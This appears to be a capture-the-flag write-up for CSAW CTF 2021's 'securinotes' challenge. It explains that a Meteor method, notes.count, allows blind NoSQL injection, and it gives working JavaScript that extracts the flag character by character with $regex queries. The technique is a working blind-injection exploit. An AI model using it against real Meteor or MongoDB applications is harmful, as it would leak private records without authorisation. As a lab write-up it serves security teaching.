# CSAW CTF 2021 - securinotes

We can discover calls to Meteor javascript inteface in the sourcecode, which the `notes.count` allows arbitrary query to the NoSQL backend and return count of documents. (blind injection)

## 

```js
# It is discovered that the flag is 11 chars and `[a-z0-9A-Z]`
Meteor.call('notes.count', {body: {$regex: 'flag\{[a-z0-9A-Z]{11}\}'}}, console.log);

# Brute the flag
let chars = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';

let req = (t) => new Promise((resolve) => Meteor.call('notes.count', {body: {$regex: 'flag\{' + t + '.{' + (11 - t.length) + '}\}'}}, (a,b) => resolve(b)));

let brute = async (prefix) => {
    for (const c of chars) {
        const result = await req(prefix + c);
        if (result > 0) {
            console.log(prefix + c, result);
            return prefix + c;
        }
    }
}

let prefix = '';
for (let i = 0; i < 11; i++) {
    prefix = await brute(prefix);
}

```